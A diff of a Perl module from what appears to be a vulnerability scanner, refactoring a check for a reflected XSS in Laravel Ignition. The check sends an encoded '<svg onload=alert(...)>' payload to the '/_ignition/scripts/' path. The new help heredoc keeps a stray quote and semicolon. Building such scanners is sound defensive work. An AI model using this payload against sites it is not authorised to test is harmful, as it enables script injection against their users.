@@ -15,10 +15,10 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
         );
 
         if ($target) {
-            if ($target !~ /^http(s)?:\/\//x) {
+            if ($target !~ /^http(?:s)?:\/\//x) {
                 $target = "https://$target";
             }
-            
+
             my @uuid      = Spellbook::Helper::Generate_UUID -> new(["--version" => 4, "--repeat" => 1]);
             my $payload   = "$target/_ignition/scripts/--%3E%3Csvg%20onload=alert%28$uuid[0]%29%3E";
             my $userAgent = Spellbook::Core::UserAgent -> new();
@@ -31,16 +31,19 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
             ) {
                 push @results, $target;
             }
-            
+
             return @results;
         }
 
         if ($help) {
-            return "
-                \rAdvisory::CVE_
-                \r=======================
-                \r-h, --help     See this menu
-                \r-t, --target   Define a target\n\n";
+            return<<"EOT";
+
+Advisory::CVE_
+=======================
+-h, --help     See this menu
+-t, --target   Define a target\n\n";
+
+EOT
         }
 
         return 0;
